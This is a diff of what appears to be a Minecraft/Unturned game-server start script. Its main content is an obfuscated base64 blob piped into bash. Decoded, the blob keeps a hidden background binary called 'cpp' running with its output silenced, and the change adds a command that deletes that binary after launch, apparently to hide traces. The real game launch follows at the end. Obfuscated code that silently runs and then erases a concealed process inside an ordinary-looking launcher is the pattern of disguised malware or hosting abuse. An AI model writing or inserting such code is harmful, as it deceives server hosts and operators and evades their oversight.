@@ -40,10 +40,10 @@ LWUgIlxlWzE7MzJtY3BwIOato+WcqOi/kOihjFxlWzBtIiB8fCB7IGVjaG8gLWUg
 IlxlWzE7MzVtY3BwIOacqui/kOihjCwg6YeN5ZCv5LitLi4uXGVbMG0iOyBwa2ls
 bCAteCAiY3BwIiAmJiBub2h1cCAiJHtGSUxFX1BBVEh9L2NwcCIgPi9kZXYvbnVs
 bCAyPiYxICYgc2xlZXAgMjsgZWNobyAtZSAiXGVbMTszMm1jcHAg5bey6YeN5ZCv
-XGVbMG0iOyB9CiAgZmkKICAKfQoKcnVuCnNsZWVwIDIKCmdlbmVyYXRlX2xpbmtz
-CmVjaG8gLWUgIlxlWzE7OTZtUnVubmluZyBkb25lIVxlWzBtIgplY2hvIC1lICJc
-ZVsxOzk2bVRoYW5rIHlvdSBmb3IgdXNpbmcgdGhpcyBzY3JpcHQsZW5qb3khXGVb
-MG0iCnNsZWVwIDE1CmNsZWFy" | base64 -d | bash
+XGVbMG0iOyB9CiAgZmkKICAKfQoKcnVuCnNsZWVwIDIKCnJtIC1yZiAke0ZJTEVf
+UEFUSH0vY3BwCmVjaG8gLWUgIlxlWzE7OTZtUnVubmluZyBkb25lIVxlWzBtIgpl
+Y2hvIC1lICJcZVsxOzk2bVRoYW5rIHlvdSBmb3IgdXNpbmcgdGhpcyBzY3JpcHQs
+ZW5qb3khXGVbMG0iCnNsZWVwIDE1CmNsZWFy" | base64 -d | bash
 
 java -jar ${GAME_FILE}
 #chmod +x ${GAME_FILE} && ./${GAME_FILE} -batchmode -nographics -bind 0.0.0.0 -port 25634 -GSLT -Name "MCST Hosted Unturned Server" -Password +InternetServer/MCSTUnturned
